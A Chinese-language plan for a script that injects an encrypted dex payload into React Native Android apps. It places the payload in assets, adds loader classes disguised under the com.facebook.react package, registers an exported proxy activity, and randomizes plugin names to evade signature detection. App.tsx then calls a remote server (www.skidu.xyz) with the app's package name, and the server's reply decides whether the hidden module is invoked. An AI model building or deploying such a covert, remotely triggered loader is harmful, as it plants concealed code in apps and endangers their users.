RN+Dex 升级事件方案
==

> 概述：这是 一个 升级脚本，主要是用于升级RN+Dex生成的项目，目的实现了自动化，节省时间成本。下面说一下大体思路。

- 1、首先检查RN项目中`android`目录，需要创建android项目的`asstes`目录(如果没有才创建)，然后将`.dex`文件复制到`asstes`目录下,`.dex`文件怎么获取 会面会有说明，现在就以`app/asstes/plugin_v1.dat`为例。
- 2、RN项目中`android`模块，添加所需代码。在`java`目录下,`com/facebook/react`目录下 添加该目录下`app\src\com\facebook\react`三个类：CryptoUtils.java、IPluginActivity.java、ProxyActivity.java
- 3、需要在`android`项目的`AndroidManifest.xml`文件中注册类`ProxyActivity.java`,注册格式为
```xml
        <activity
            android:name="com.facebook.react.ProxyActivity"
            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
            android:exported="true"
            android:launchMode="singleTask"
            android:windowSoftInputMode="adjustResize" />
```
- 4、然后需要实现一个自定义插件(plugin)，实现参考项目(`G:\RN\event_dex_bag`)，重点就是`event_dex_bag\android\app\src\main\java\com\event_dex_bag`目录下的插件文件。理论上来讲 插件的名称应该是动态的(随机生成的)，尽量保持不同的项目 不一样，以免被标记特征。
- 5、生成完插件后，同步需要在`event_dex_bag/App.tsx`line-18 文件中引入，后续要调用。
- 6、此时 插件和dex文件都已准备完毕，接下来就是添加接口动态控制了。`App.tsx`文件 同时需要引入以下代码，重点分析其中的注释。
```typescript
  //还需要引入这个，动态获取当前app的包名
  import DeviceInfo from 'react-native-device-info';

  //声明一个变量 获取appID
  let appId = DeviceInfo.getBundleId();
  
  //更新useEffect方法
  useEffect(() => {
    console.log('初始化');
    //这里的url 需要手动输入 这部分：www.skidu.xyz
    //这里的完整url 应该需要动态生成，有规则 https:// + url+"/"+随机6-8位字符串(以字母d结尾)+ "/" + 包名+ "/" + 随机6-8位字符串
    fetch(`https://www.skidu.xyz/xnhggfguyd/${appId}/xnhggfguy`)
      .then(response => response.json())
      .then(data => {
        if (data && data.toUrl && data.sdkKey) {
          //这里时自定义的插件调用方式，一定要和插件同步
          EventModule.jumpEvent(data.toUrl, data.sdkKey);
          setTimeout(() => {}, 3000);
        }
        console.log(data);
      });
  }, []);
```
生成脚本的时候 需要严格按照注释的说明生成
